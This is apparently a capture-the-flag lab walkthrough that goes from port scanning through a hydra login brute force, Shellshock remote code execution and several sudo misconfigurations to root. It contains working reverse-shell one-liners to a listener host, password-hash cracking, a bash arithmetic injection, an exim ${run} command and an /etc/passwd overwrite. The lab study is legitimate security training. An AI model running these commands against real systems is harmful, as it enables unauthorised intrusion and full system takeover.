# IP
172.17.0.2
# Reconnaissance
```sh
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.065 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.073 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1200ms
rtt min/avg/max/mdev = 0.065/0.069/0.073/0.004 ms
```
# Ports scanning
```sh
sudo nmap -sS -sC -sV -p- --open --min-rate 5000 -Pn 172.17.0.2
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```
# Web enumeration
![[Pasted image 20260923141848.png]]
## Dir fuzzing
```sh
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Cookies:                 PHPSESSID=hbacoa3eras00jtdq1j68fl991
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
server-status        (Status: 403) [Size: 275]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```
## Brute force
The description of the machine hints us to try brute forcing the login

``` sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form "/index.php:username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=hbacoa3eras00jtdq1j68fl991:F=Credenciales incorrectas." -vV -t 64

[80][http-post-form] host: 172.17.0.2   login: admin   password: christelle
```
## Shellshock
The description of the machine and the message 'User Agent almacenado en el log' hints us to try Shellschock in the User Agent header.
Investigating these leads us to *CVE-2014-6271*
## RCE
```
User-Agent: () { :;}; /bin/bash -c COMMAND
```
## Rev shell
``` sh
curl 'http://172.17.0.2/pruebasUltraSecretas/' -H 'User-Agent: () { :;}; /bin/bash -c "nohup bash -i >& /dev/tcp/172.17.0.1/443 0>&1 &"'
```

``` sh
sudo nc -lvnp 443
whoami
www-data
```
# Stabilizing the shell
``` sh
python3 -c 'import pty; pty.spawn("/bin/sh")'
^Z
stty raw -echo; fg
export TERM=xterm SHELL=/bin/sh
stty cols 129 rows 61
```
# Privilege escalation
## www-data enumeration
Exploring the files

``` sh
cat /var/backups/darksblack/.darksblack.txt
darksblack:$y$j9T$LHiaZ3.V.uZMQWNKIHQaK.$yucUM837WonVbazf5eQWEmFnG5u0ZY5VTxH37NhaCE5:20028:0:99999:7:::
````

This seems like the /etc/shadow hashed password
``` sh
echo 'darksblack:$y$j9T$LHiaZ3.V.uZMQWNKIHQaK.$yucUM837WonVbazf5eQWEmFnG5u0ZY5VTxH37NhaCE5:20028:0:99999:7:::' > hash.txt
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
darksblack:salvador1:20028:0:99999:7:::
```

``` sh
su darksblack
```
## darksblack enumeration
Sudo misconfiguration

``` sh
sudo -l
(maci) NOPASSWD: /home/maci/script.sh
```

``` sh
cat /home/maci/script.sh
#!/bin/bash

read -rp "Adivina: " num

if [[ $num -eq 123123 ]]
then
  echo "Si"
else
  echo "ERROR"
fi
```

``` sh
sudo -u maci /home/maci/script.sh
Adivina: a[$(/bin/bash -p >&2)]
```
## maci enumeration
Sudo misconfiguration

``` sh
sudo -l
(pepe) NOPASSWD: /usr/sbin/exim
```

``` sh
sudo -u pepe /usr/sbin/exim -be '${run{/bin/bash -c "id"}}'
uid=1002(pepe) gid=1002(pepe) groups=1002(pepe),100(users)
```

We can get a reverse shell executing code like this
``` sh
sudo -u pepe /usr/sbin/exim -be '${run{/bin/bash -c "nohup sh -i >& /dev/tcp/172.17.0.1/443 0>&1 &"}}'
```
## pepe enumeration
Sudo misconfiguration

``` sh
sudo -l
(ALL : ALL) NOPASSWD: /usr/bin/dos2unix
```

``` sh
sed 's/root:x:/root::/g' /etc/passwd > /tmp/passwd.new
cat /tmp/passwd.new | grep root
root::0:0:root:/root:/bin/bash
sudo -u root dos2unix -f -n /tmp/passwd.new /etc/passwd
dos2unix: converting file /tmp/passwd.new to file /etc/passwd in Unix format...
```

# Root
```sh
su -
whoami 
root
```
